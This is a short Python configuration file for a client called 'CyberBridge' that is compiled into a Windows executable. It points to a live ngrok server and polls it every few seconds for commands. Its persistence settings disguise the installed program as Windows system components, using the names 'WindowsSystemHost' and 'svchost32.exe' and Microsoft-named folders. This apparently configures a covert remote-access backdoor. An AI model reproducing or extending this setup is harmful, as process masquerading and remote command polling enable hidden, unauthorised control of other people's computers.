"""
CyberBridge - Client Configuration
Edit SERVER_URL before building the .exe.

Para ngrok: pegar la URL pública que da ngrok aquí.
Para Tailscale: usar "http://100.x.x.x:18812"
Para LAN: usar "http://192.168.x.x:18812"
"""

# ─── Server address ────────────────────────────────────────────────────────────
SERVER_URL = "https://10ec-190-107-209-205.ngrok-free.app"

# ─── Polling ──────────────────────────────────────────────────────────────────

# Segundos entre cada petición de comandos al servidor
POLL_INTERVAL = 3

# ─── Persistence ──────────────────────────────────────────────────────────────

APP_REGISTRY_NAME  = "WindowsSystemHost"
INSTALL_SUBPATH    = r"Microsoft\Windows\SystemHost"
INSTALLED_EXE_NAME = "svchost32.exe"

# ─── Logging ──────────────────────────────────────────────────────────────────

LOG_SUBPATH = r"Microsoft\Logs"
LOG_FILE    = "wsh.log"
